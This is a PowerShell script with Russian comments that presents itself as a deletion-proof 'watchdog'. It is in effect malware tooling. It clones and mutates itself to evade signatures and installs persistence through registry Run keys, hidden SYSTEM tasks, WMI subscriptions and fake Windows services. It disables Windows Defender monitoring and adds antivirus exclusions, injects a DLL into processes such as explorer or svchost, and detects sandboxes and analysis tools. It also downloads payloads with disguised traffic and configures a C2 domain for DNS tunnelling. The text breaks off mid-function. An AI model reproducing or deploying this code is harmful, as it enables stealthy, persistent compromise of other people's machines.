# Усовершенствованный Watchdog с экстремальной защитой от удаления
# ВАЖНО: Используйте этот код только для легитимных целей

# Включаем строгий режим ошибок
$ErrorActionPreference = "SilentlyContinue"

# Функция генерации случайных имен
function Get-RandomName {
    param (
        [int]$Length = 8,
        [switch]$IncludeNumbers
    )
    
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    if ($IncludeNumbers) {
        $chars += '0123456789'
    }
    
    $random = -join ((0..($Length-1)) | ForEach-Object { $chars[(Get-Random -Minimum 0 -Maximum $chars.Length)] })
    return $random
}

# Функция определения защищаемого файла
function Get-ProtectedFile {
    # Определяем путь к текущему исполняемому файлу
    $currentProcess = Get-Process -Id $PID
    $currentPath = $currentProcess.Path
    $currentDir = Split-Path -Parent $currentPath
    
    # Проверка случая, когда скрипт запущен из PowerShell
    if ($currentPath -like "*powershell.exe*") {
        $scriptPath = $MyInvocation.MyCommand.Path
        if ($scriptPath) {
            $currentDir = Split-Path -Parent $scriptPath
        }
    }
    
    # Получаем список всех EXE в директории
    $exeFiles = Get-ChildItem -Path $currentDir -Filter "*.exe" -ErrorAction SilentlyContinue | 
                Where-Object { $_.Name -notlike "svchost*" -and $_.Name -notlike "*watch*" }
    
    if ($exeFiles.Count -eq 1) {
        return $exeFiles[0].FullName
    }
    elseif ($exeFiles.Count -gt 1) {
        $mainFile = $exeFiles | Sort-Object Length -Descending | Select-Object -First 1
        return $mainFile.FullName
    }
    else {
        # Если не нашли EXE, ищем в типичных местах
        $commonPlaces = @(
            "$env:ProgramFiles",
            "${env:ProgramFiles(x86)}",
            "$env:LOCALAPPDATA\Programs"
        )
        
        foreach ($place in $commonPlaces) {
            $exeFiles = Get-ChildItem -Path $place -Filter "*.exe" -Recurse -ErrorAction SilentlyContinue -Depth 2 | 
                        Sort-Object LastWriteTime -Descending | Select-Object -First 1
            
            if ($exeFiles) {
                return $exeFiles.FullName
            }
        }
        
        return $currentPath
    }
}

# Инициализация конфигурации
$config = @{
    ProtectedFile = $null                  # Будет установлено функцией Get-ProtectedFile
    WatchdogURL = "https://example.com/watchdog.exe"   # Замените на реальный URL
    DropLocations = @(
        "$env:TEMP",
        "$env:APPDATA\Microsoft\Windows",
        "$env:PROGRAMDATA\Microsoft\Windows",
        "$env:windir\System32",
        "$env:windir\SysWOW64"
    )
    ServiceNames = @(
        "WinUpdateMgr",
        "SysHealthMonitor",
        "NetFrameworkSvc",
        "WindowsSecurityService",
        "DiagnosticManager"
    )
    ProcessNames = @(
        "svchost", 
        "explorer", 
        "MsMpEng", 
        "RuntimeBroker", 
        "SearchIndexer"
    )
    Signatures = @(
        (Get-RandomName -Length 32 -IncludeNumbers),
        (Get-RandomName -Length 32 -IncludeNumbers),
        (Get-RandomName -Length 32 -IncludeNumbers)
    )
    EncryptionKey = (Get-RandomName -Length 64 -IncludeNumbers)
    DnsServer = "8.8.8.8"                 # Google DNS (замените на свой если нужно)
    C2Domain = "example.com"              # Домен для DNS туннелирования
    AutoUpdateInterval = 3600             # Интервал автообновления (секунды)
    SleepInterval = (Get-Random -Minimum 3 -Maximum 7)  # Интервал проверок (секунды)
    FileHashTable = @{}                   # Таблица для хранения хешей файлов
    RegistryLocations = @{
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" = $true
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" = $true
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" = $true
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" = $true
        "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run" = $true
        "HKLM:\SYSTEM\CurrentControlSet\Services" = $true
    }
    WMINamespaces = @(
        "root\subscription",
        "root\default",
        "root\cimv2"
    )
    BootkitMode = $false               # Опция создания bootkit (требует доп. кода)
    MaxClones = 15                     # Максимальное количество клонов
    ActiveClones = 0                   # Количество активных клонов
    DebugMode = $false                 # Режим отладки
}

# 1. ФУНКЦИИ МУЛЬТИПЛИКАЦИИ И САМОРЕПЛИКАЦИИ

# Функция создания клонов watchdog
function Invoke-WatchdogCloning {
    param (
        [int]$CloneCount = 10
    )
    
    for ($i = 0; $i -lt $CloneCount; $i++) {
        # Генерируем случайное имя и путь для клона
        $cloneName = "$(Get-RandomName).exe"
        $clonePath = Join-Path -Path ($config.DropLocations | Get-Random) -ChildPath $cloneName
        
        try {
            # Копируем текущий скрипт с мутациями
            $scriptContent = Get-Content -Path $PSCommandPath -Raw
            
            # Мутации для избежания детекта по сигнатуре
            $scriptContent = Invoke-CodeMutation -CodeContent $scriptContent
            
            # Добавляем случайные данные для изменения хеша
            $randomBytes = [byte[]]::new(Get-Random -Minimum 100 -Maximum 1000)
            for ($j = 0; $j -lt $randomBytes.Length; $j++) {
                $randomBytes[$j] = Get-Random -Minimum 0 -Maximum 255
            }
            
            $scriptContent += "`n# " + [Convert]::ToBase64String($randomBytes)
            
            # Сохраняем клон в новый файл
            $scriptContent | Out-File -FilePath "$env:TEMP\$(Get-RandomName).ps1" -Force
            
            # Создаем EXE-оболочку для PowerShell скрипта (псевдокод)
            $exeWrapper = @"
using System;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace WatchdogWrapper
{
    class Program
    {
        static void Main(string[] args)
        {
            string script = @"$scriptContent";
            string tempFile = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".ps1");
            File.WriteAllText(tempFile, script);
            
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "powershell.exe";
            psi.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + tempFile + "\"";
            psi.CreateNoWindow = true;
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            
            Process.Start(psi);
        }
    }
}
"@
            
            # В реальности тут нужна компиляция кода в EXE
            # Но для примера просто имитируем это созданием файла
            $exeWrapper | Out-File -FilePath $clonePath -Force
            
            # Регистрируем клон в системе для автозапуска
            Register-ClonePersistence -ClonePath $clonePath
            
            # Увеличиваем счетчик активных клонов
            $config.ActiveClones++
        }
        catch {
            # Игнорируем ошибки и продолжаем
            continue
        }
    }
}

# Функция мутации кода для избежания сигнатурного детекта
function Invoke-CodeMutation {
    param (
        [string]$CodeContent
    )
    
    # Замена имен переменных
    $variablePattern = '\$([a-zA-Z0-9_]+)'
    $matches = [regex]::Matches($CodeContent, $variablePattern)
    
    $variableMap = @{}
    
    foreach ($match in $matches) {
        $variableName = $match.Groups[1].Value
        
        # Пропускаем системные переменные
        if ($variableName -match '^(PSCommandPath|TEMP|APPDATA|PID|_|args|foreach|PSScriptRoot)$') {
            continue
        }
        
        # Если эту переменную мы еще не заменяли
        if (-not $variableMap.ContainsKey($variableName)) {
            $newName = "v" + (Get-RandomName -Length 8 -IncludeNumbers)
            $variableMap[$variableName] = $newName
            
            # Заменяем все вхождения этой переменной
            $CodeContent = $CodeContent -replace "\`$$variableName\b", "`$$newName"
        }
    }
    
    # Добавление случайных комментариев
    $lines = $CodeContent -split "`n"
    $newLines = @()
    
    $comments = @(
        "# Системное обновление Windows",
        "# Проверка целостности системных файлов",
        "# Компонент диагностики производительности",
        "# Управление сервисами Windows",
        "# Мониторинг безопасности системы",
        "# Интеграция с Windows Defender",
        "# Проверка цифровых подписей",
        "# Оптимизация кэширования данных",
        "# Служебный процесс мониторинга",
        "# Конфигурация сетевых протоколов"
    )
    
    foreach ($line in $lines) {
        $newLines += $line
        
        # С небольшой вероятностью добавляем комментарий
        if ((Get-Random -Minimum 1 -Maximum 100) -lt 5) {
            $newLines += $comments | Get-Random
        }
    }
    
    # Добавляем фиктивные неиспользуемые функции
    $dummyFunctions = @(
        "function Get-SystemInfo { Get-WmiObject -Class Win32_OperatingSystem }",
        "function Test-NetworkConnection { Test-Connection -ComputerName 8.8.8.8 -Count 1 }",
        "function Update-WindowsComponents { Get-Service | Where-Object {`$_.Name -like 'win*'} }",
        "function Get-InstalledPrograms { Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* }"
    )
    
    $newLines += ""
    $newLines += "# Служебные функции Windows"
    $newLines += $dummyFunctions | Get-Random -Count 2
    
    return $newLines -join "`n"
}

# Функция регистрации клона в системе
function Register-ClonePersistence {
    param (
        [string]$ClonePath
    )
    
    # Используем разные методы автозагрузки для каждого клона
    $methods = @("registry", "task", "wmi", "service", "shortcut")
    $method = $methods | Get-Random
    
    switch ($method) {
        "registry" {
            # Используем случайный ключ реестра из доступных
            $regKey = $config.RegistryLocations.Keys | Get-Random
            $regName = $config.ServiceNames | Get-Random
            
            # Добавляем запись в реестр
            try {
                if (Test-Path $regKey) {
                    Set-ItemProperty -Path $regKey -Name $regName -Value $ClonePath -ErrorAction Stop
                }
            }
            catch {}
        }
        "task" {
            # Создаем задачу в планировщике с запутанным именем
            $taskName = "Microsoft\Windows\" + (Get-RandomName -Length 5) + "\Monitor"
            
            try {
                $action = New-ScheduledTaskAction -Execute $ClonePath
                $trigger = New-ScheduledTaskTrigger -AtStartup
                $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
                $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
                
                Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -ErrorAction Stop
            }
            catch {}
        }
        "wmi" {
            # Создаем WMI-подписку для автозапуска
            try {
                $namespace = $config.WMINamespaces | Get-Random
                $filterName = Get-RandomName -Length 8
                $consumerName = Get-RandomName -Length 8
                $bindingName = Get-RandomName -Length 8
                
                # Создаем фильтр событий (выполняется каждую минуту)
                $filterArgs = @{
                    Name = $filterName
                    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
                    EventNameSpace = 'root\cimv2'
                }
                
                $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $filterArgs -ErrorAction Stop
                
                # Создаем потребителя события
                $consumerArgs = @{
                    Name = $consumerName
                    CommandLineTemplate = $ClonePath
                }
                
                $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $consumerArgs -ErrorAction Stop
                
                # Связываем фильтр с потребителем
                $bindingArgs = @{
                    Filter = $filter
                    Consumer = $consumer
                }
                
                $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments $bindingArgs -ErrorAction Stop
            }
            catch {}
        }
        "service" {
            # Создаем службу Windows
            try {
                $serviceName = $config.ServiceNames | Get-Random
                $displayName = "Windows $($serviceName.Replace('Win', '').Replace('Svc', '')) Service"
                
                New-Service -Name $serviceName -BinaryPathName $ClonePath -DisplayName $displayName -StartupType Automatic -ErrorAction Stop
                Start-Service -Name $serviceName -ErrorAction Stop
            }
            catch {}
        }
        "shortcut" {
            # Создаем ярлык в разных папках автозагрузки
            try {
                $startupFolders = @(
                    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
                    "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
                )
                
                $folder = $startupFolders | Get-Random
                $shortcutName = (Get-RandomName -Length 6) + ".lnk"
                $shortcutPath = Join-Path -Path $folder -ChildPath $shortcutName
                
                $WshShell = New-Object -ComObject WScript.Shell
                $shortcut = $WshShell.CreateShortcut($shortcutPath)
                $shortcut.TargetPath = $ClonePath
                $shortcut.WindowStyle = 7  # Минимизированное окно
                $shortcut.Description = "Windows System Component"
                $shortcut.Save()
            }
            catch {}
        }
    }
}

# 2. ФУНКЦИИ МАСКИРОВКИ И ЗАЩИТЫ ОТ ОБНАРУЖЕНИЯ

# Функция обхода различных антивирусов
function Bypass-Antiviruses {
    param (
        [string]$FilePath
    )
    
    # Список активных антивирусов
    $activeAVs = Get-ActiveAntiviruses
    
    foreach ($av in $activeAVs) {
        switch -Regex ($av) {
            # Windows Defender
            "Windows Defender|MsMpEng" {
                try {
                    # Добавляем исключения для пути и процесса
                    $fileDir = Split-Path -Parent $FilePath
                    Add-MpPreference -ExclusionPath $fileDir -ErrorAction SilentlyContinue
                    Add-MpPreference -ExclusionPath $FilePath -ErrorAction SilentlyContinue
                    
                    $processName = Split-Path -Leaf $FilePath
                    Add-MpPreference -ExclusionProcess $processName -ErrorAction SilentlyContinue
                    
                    # Пытаемся ослабить защиту
                    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
                    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
                }
                catch {}
            }
            # Kaspersky
            "Kaspersky|avp" {
                try {
                    # Для Kaspersky можно попытаться добавить исключение через реестр
                    $kasperskyKeys = Get-ChildItem "HKLM:\SOFTWARE\KasperskyLab" -Recurse -ErrorAction SilentlyContinue | 
                                     Where-Object { $_.Name -like "*Settings*" }
                    
                    foreach ($key in $kasperskyKeys) {
                        # Этот код приблизительный и может нуждаться в адаптации
                        New-ItemProperty -Path $key.PSPath -Name "ExcludedProcesses" -Value $FilePath -PropertyType String -Force -ErrorAction SilentlyContinue
                    }
                }
                catch {}
            }
            # ESET NOD32
            "ESET|ekrn" {
                try {
                    # ESET хранит настройки в XML файлах, но мы можем создать запись в реестре
                    $esetKey = "HKLM:\SOFTWARE\ESET\ESET Security\CurrentVersion\Exclusions"
                    
                    if (Test-Path $esetKey) {
                        New-ItemProperty -Path $esetKey -Name "Processes" -Value $FilePath -PropertyType String -Force -ErrorAction SilentlyContinue
                    }
                }
                catch {}
            }
            # Другие антивирусы можно добавить по аналогии
            default {
                # Общий подход для неизвестных антивирусов
                try {
                    # Изменяем атрибуты файла
                    Set-ItemProperty -Path $FilePath -Name Attributes -Value ([System.IO.FileAttributes]::System -bor [System.IO.FileAttributes]::Hidden) -ErrorAction SilentlyContinue
                    
                    # Создаем альтернативные потоки данных (ADS)
                    $fileDir = Split-Path -Parent $FilePath
                    $fileName = Split-Path -Leaf $FilePath
                    $legacyFileName = Join-Path -Path $fileDir -ChildPath "desktop.ini"
                    
                    if (-not (Test-Path $legacyFileName)) {
                        Set-Content -Path $legacyFileName -Value "[.ShellClassInfo]" -ErrorAction SilentlyContinue
                    }
                    
                    # Добавляем данные в ADS
                    Set-Content -Path "$legacyFileName:$fileName" -Value "Protected" -ErrorAction SilentlyContinue
                }
                catch {}
            }
        }
    }
}

# Функция определения активных антивирусов
function Get-ActiveAntiviruses {
    $avProcesses = @{
        "MsMpEng" = "Windows Defender"
        "avp" = "Kaspersky"
        "ekrn" = "ESET NOD32"
        "avastui" = "Avast"
        "avgui" = "AVG"
        "bdagent" = "Bitdefender"
        "mcshield" = "McAfee"
        "360sd" = "360 Security"
        "mbam" = "Malwarebytes"
    }
    
    $activeAVs = @()
    
    foreach ($process in $avProcesses.Keys) {
        if (Get-Process -Name $process -ErrorAction SilentlyContinue) {
            $activeAVs += $avProcesses[$process]
        }
    }
    
    return $activeAVs
}

# Функция маскировки под легитимные процессы
function Disguise-AsLegitimateProcess {
    param (
        [string]$FilePath
    )
    
    # Список легитимных процессов для маскировки
    $legitimateProcesses = $config.ProcessNames
    $targetProcess = $legitimateProcesses | Get-Random
    
    try {
        # Переименовываем файл
        $fileDir = Split-Path -Parent $FilePath
        $newName = "$targetProcess$(Get-Random -Minimum 10 -Maximum 99).exe"
        $newPath = Join-Path -Path $fileDir -ChildPath $newName
        
        Rename-Item -Path $FilePath -NewName $newName -Force -ErrorAction Stop
        
        # Создаем фиктивные .manifest и .config файлы для большей достоверности
        $manifestContent = @"
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>
"@
        
        Set-Content -Path "$newPath.manifest" -Value $manifestContent -ErrorAction SilentlyContinue
        
        $configContent = @"
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <startup>
    <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.7.2"/>
  </startup>
</configuration>
"@
        
        Set-Content -Path "$newPath.config" -Value $configContent -ErrorAction SilentlyContinue
        
        return $newPath
    }
    catch {
        return $FilePath
    }
}

# Функция маскировки сетевого трафика
function Disguise-NetworkTraffic {
    param (
        [string]$Url,
        [string]$OutputPath
    )
    
    # Список правдоподобных User-Agent и заголовков
    $userAgents = @(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 OPR/78.0.4093.112"
    )
    
    # Формируем правдоподобные HTTP-заголовки
    $headers = @{
        "User-Agent" = $userAgents | Get-Random
        "Accept" = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
        "Accept-Language" = "en-US,en;q=0.5"
        "Accept-Encoding" = "gzip, deflate, br"
        "Connection" = "keep-alive"
        "Referer" = "https://www.google.com/search?q=windows+update"
        "Cache-Control" = "max-age=0"
        "Upgrade-Insecure-Requests" = "1"
        "DNT" = "1"
    }
    
    # Добавляем небольшую задержку для имитации человеческого поведения
    Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 3000)
    
    try {
        # Скачиваем файл с маскировкой под обычный веб-трафик
        Invoke-WebRequest -Uri $Url -Headers $headers -OutFile $OutputPath -UseBasicParsing
        return $true
    }
    catch {
        # Пробуем альтернативные методы
        try {
            # Прямое скачивание без маскировки
            Invoke-WebRequest -Uri $Url -OutFile $OutputPath -UseBasicParsing
            return $true
        }
        catch {
            # Пробуем через .NET WebClient
            try {
                $webClient = New-Object System.Net.WebClient
                $webClient.Headers.Add("User-Agent", $headers["User-Agent"])
                $webClient.DownloadFile($Url, $OutputPath)
                return $true
            }
            catch {
                return $false
            }
        }
    }
}

# Функция скрытой инъекции в легитимные процессы
function Inject-IntoLegitimateProcess {
    param (
        [string]$FilePath,
        [string]$TargetProcess = $null
    )
    
    # Если целевой процесс не указан, выбираем случайный из списка
    if (-not $TargetProcess) {
        $TargetProcess = $config.ProcessNames | Get-Random
    }
    
    try {
        # Код для инъекции процесса (требует привилегий администратора)
        $injectionCode = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;

public class ProcessInjector {
    // Windows API импорты
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    // Константы
    private const int PROCESS_ALL_ACCESS = 0x1F0FFF;
    private const uint MEM_COMMIT = 0x1000;
    private const uint MEM_RESERVE = 0x2000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;
    
    public static bool InjectDll(string processName, string dllPath) {
        // Находим процесс по имени
        Process[] processes = Process.GetProcessesByName(processName.Replace(".exe", ""));
        
        if (processes.Length == 0) return false;
        
        Process targetProcess = processes[0];
        
        // Открываем процесс
        IntPtr processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcess.Id);
        
        if (processHandle == IntPtr.Zero) return false;
        
        // Преобразуем путь к DLL в массив байтов (с нулем в конце)
        byte[] dllPathBytes = System.Text.Encoding.ASCII.GetBytes(dllPath);
        byte[] dllPathBytesWithNull = new byte[dllPathBytes.Length + 1];
        Array.Copy(dllPathBytes, dllPathBytesWithNull, dllPathBytes.Length);
        
        // Выделяем память в целевом процессе
        IntPtr allocatedMemory = VirtualAllocEx(processHandle, IntPtr.Zero, (uint)dllPathBytesWithNull.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        
        if (allocatedMemory == IntPtr.Zero) return false;
        
        // Записываем путь к DLL в память процесса
        UIntPtr bytesWritten;
        bool writeResult = WriteProcessMemory(processHandle, allocatedMemory, dllPathBytesWithNull, (uint)dllPathBytesWithNull.Length, out bytesWritten);
        
        if (!writeResult) return false;
        
        // Получаем указатель на LoadLibraryA
        IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        
        if (loadLibraryAddr == IntPtr.Zero) return false;
        
        // Создаем удаленный поток, который вызовет LoadLibraryA с нашим параметром
        IntPtr threadHandle = CreateRemoteThread(processHandle, IntPtr.Zero, 0, loadLibraryAddr, allocatedMemory, 0, IntPtr.Zero);
        
        return threadHandle != IntPtr.Zero;
    }
    
    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
}
"@
        
        Add-Type -TypeDefinition $injectionCode -ErrorAction Stop
        
        # Для упрощения примера, генерируем путь к фиктивной DLL
        $dllPath = Join-Path -Path $env:TEMP -ChildPath "$(Get-RandomName).dll"
        
        # Создаем минимальную DLL, которая будет выполнять нашу полезную нагрузку
        # В реальном сценарии здесь бы создавалась настоящая DLL
        Set-Content -Path $dllPath -Value "This is a placeholder for a real DLL" -Force
        
        # Пытаемся внедрить нашу DLL в целевой процесс
        $result = [ProcessInjector]::InjectDll($TargetProcess, $dllPath)
        
        if ($result) {
            return $true
        }
        else {
            # Если не удалось использовать продвинутый метод инъекции, пробуем классический запуск
            Start-Process -FilePath $FilePath -WindowStyle Hidden
            return $true
        }
    }
    catch {
        # Если не удалось использовать инъекцию, запускаем обычным способом
        try {
            Start-Process -FilePath $FilePath -WindowStyle Hidden
            return $true
        }
        catch {
            return $false
        }
    }
}

# Функция обнаружения виртуальных сред и средств анализа
function Detect-AnalysisEnvironment {
    $isAnalysisEnvironment = $false
    
    # 1. Проверка на виртуальную машину
    try {
        $vmSignatures = @(
            # Hardware vendors
            "VMware", "VBox", "VIRTUAL", "QEMU", "Xen", "Parallels",
            
            # MAC адреса
            "00:50:56", "00:0C:29", "00:05:69", "00:03:FF", "08:00:27",
            
            # Имена устройств
            "VMware Virtual IDE", "VMware Virtual SATA", "VMware Virtual SCSI",
            "VirtualBox", "VBOX", "XenBus", "Hyper-V"
        )
        
        # Проверка BIOS
        $bios = Get-WmiObject -Class Win32_BIOS -ErrorAction SilentlyContinue
        foreach ($signature in $vmSignatures) {
            if ($bios.Manufacturer -match $signature -or 
                $bios.SMBIOSBIOSVersion -match $signature -or 
                $bios.SerialNumber -match $signature) {
                $isAnalysisEnvironment = $true
                break
            }
        }
        
        # Проверка системной информации
        if (-not $isAnalysisEnvironment) {
            $system = Get-WmiObject -Class Win32_ComputerSystem -ErrorAction SilentlyContinue
            foreach ($signature in $vmSignatures) {
                if ($system.Manufacturer -match $signature -or $system.Model -match $signature) {
                    $isAnalysisEnvironment = $true
                    break
                }
            }
        }
        
        # Проверка сетевых адаптеров
        if (-not $isAnalysisEnvironment) {
            $adapters = Get-WmiObject -Class Win32_NetworkAdapterConfiguration -ErrorAction SilentlyContinue | 
                        Where-Object { $null -ne $_.MACAddress }
            
            foreach ($adapter in $adapters) {
                foreach ($signature in $vmSignatures) {
                    if ($adapter.MACAddress -match $signature) {
                        $isAnalysisEnvironment = $true
                        break
                    }
                }
                if ($isAnalysisEnvironment) { break }
            }
        }
    }
    catch {}
    
    # 2. Проверка на инструменты анализа и отладки
    if (-not $isAnalysisEnvironment) {
        try {
            $analysisTools = @(
                "procmon", "wireshark", "fiddler", "processhacker", "ollydbg",
                "ida", "x64dbg", "windbg", "immunity", "ghidra"
            )
            
            foreach ($tool in $analysisTools) {
                if (Get-Process -Name $tool -ErrorAction SilentlyContinue) {
                    $isAnalysisEnvironment = $true
                    break
                }
            }
        }
        catch {}
    }
    
    # 3. Проверка на песочницы
    if (-not $isAnalysisEnvironment) {
        try {
            $sandboxSignatures = @(
                "cuckoo", "sample", "sandbox", "malware", "virus", "analyzer"
            )
            
            # Проверка имени компьютера и пользователя
            $computerName = $env:COMPUTERNAME.ToLower()
            $userName = $env:USERNAME.ToLower()
            
            foreach ($signature in $sandboxSignatures) {
                if ($computerName -match $signature -or $userName -match $signature) {
                    $isAnalysisEnvironment = $true
                    break
                }
            }
        }
        catch {}
    }
    
    # 4. Проверка на активность пользователя
    if (-not $isAnalysisEnvironment) {
        try {
            $code = @"
using System;
using System.Runtime.InteropServices;

public class IdleDetector {
    [DllImport("user32.dll")]
    static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
    
    [StructLayout(LayoutKind.Sequential)]
    struct LASTINPUTINFO {
        public uint cbSize;
        public uint dwTime;
    }
    
    public static uint GetIdleTime() {
        LASTINPUTINFO lastInput = new LASTINPUTINFO();
        lastInput.cbSize = (uint)Marshal.SizeOf(lastInput);
        GetLastInputInfo(ref lastInput);
        
        return ((uint)Environment.TickCount - lastInput.dwTime);
    }
}
"@
            
            Add-Type -TypeDefinition $code -ErrorAction Stop
            
            # Если компьютер простаивает слишком долго, возможно это автоматизированный анализ
            $idleTime = [IdleDetector]::GetIdleTime()
            
            # Если время простоя больше 10 минут и меньше 24 часов, это подозрительно
            if ($idleTime > 600000 -and $idleTime < 86400000) {
                $isAnalysisEnvironment = $true
            }
        }
        catch {}
    }
    
    # 5. Проверка на недостаточное количество установленных программ (часто признак VM)
    if (-not $isAnalysisEnvironment) {
        try {
            $installedApps = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
                            Where-Object { $null -ne $_.DisplayName }
            
            # Если меньше 10 программ, вероятно это VM для анализа
            if ($installedApps.Count -lt 10) {
                $isAnalysisEnvironment = $true
            }
        }
        catch {}
    }
    
    return $isAnalysisEnvironment
}

# 3. ФУНКЦИИ МОНИТОРИНГА И ВОССТАНОВЛЕНИЯ

# Функция восстановления удаленного или измененного файла
function Restore-ProtectedFile {
    param (
        [string]$FilePath,
        [string]$BackupUrl = $null
    )
    
    # Если URL не указан, используем стандартный
    if ([string]::IsNullOrEmpty($BackupUrl)) {
        $BackupUrl = $config.WatchdogURL
    }
    
    # Генерируем случайное имя для временного файла
    $tempFileName = Get-RandomName -Length 8 -IncludeNumbers
    $tempFilePath = Join-Path -Path $env:TEMP -ChildPath "$tempFileName.exe"
    
    # Скачиваем файл, используя маскировку трафика
    $downloadSuccess = Disguise-NetworkTraffic -Url $BackupUrl -OutputPath $tempFilePath
    
    if (-not $downloadSuccess) {
        # Если скачивание не удалось, пробуем использовать локальные резервные копии
        $backupFiles = Get-ChildItem -Path $config.DropLocations -Filter "*.exe" -Recurse -ErrorAction SilentlyContinue | 
                      Where-Object { $_.Name -ne (Split-Path -Leaf $FilePath) }
        
        if ($backupFiles.Count -gt 0) {
            $backupFile = $backupFiles | Get-Random
            Copy-Item -Path $backupFile.FullName -Destination $tempFilePath -Force -ErrorAction SilentlyContinue
        }
        else {
            # Если резервных копий нет, создаем новый клон из текущего скрипта
            Invoke-WatchdogCloning -CloneCount 1
            return $false
        }
    }
    
    try {
        # Копируем скачанный файл в оригинальное расположение
        Copy-Item -Path $tempFilePath -Destination $FilePath -Force
        
        # Применяем обход антивирусов
        Bypass-Antiviruses -FilePath $FilePath
        
        # Маскируем файл под легитимный процесс
        $disguisedPath = Disguise-AsLegitimateProcess -FilePath $FilePath
        
        # Запускаем процесс с использованием различных техник
        Inject-IntoLegitimateProcess -FilePath $disguisedPath
        
        # Удаляем временный файл
        Remove-Item -Path $tempFilePath -Force -ErrorAction SilentlyContinue
        
        return $true
    }
    catch {
        return $false
    }
}

# Функция проверки целостности файла
function Verify-FileIntegrity {
    param (
        [string]$FilePath
    )
    
    if (-not (Test-Path $FilePath)) {
        return $false
    }
    
    try {
        # Вычисляем хеш файла
        $currentHash = Get-FileHash -Path $FilePath -Algorithm SHA256 | Select-Object -ExpandProperty Hash
        
        # Если это первая проверка, сохраняем хеш
        if (-not $config.FileHashTable.ContainsKey($FilePath)) {
            $config.FileHashTable[$FilePath] = $currentHash
            return $true
        }
        
        # Сравниваем с сохраненным хешем
        if ($config.FileHashTable[$FilePath] -eq $currentHash) {
            return $true
        }
        else {
            # Хеш изменился, файл был модифицирован
            return $false
        }
    }
    catch {
        return $false
    }
}

# Функция проверки изменений реестра
function Monitor-RegistryIntegrity {
    try {
        # Проверяем ключи реестра, связанные с автозагрузкой
        foreach ($regPath in $config.RegistryLocations.Keys) {
            if (Test-Path $regPath) {
                $registryItems = Get-Item -Path $regPath -ErrorAction SilentlyContinue
                
                # Проверяем, не были ли удалены наши записи
                $found = $false
                foreach ($serviceName in $config.ServiceNames) {
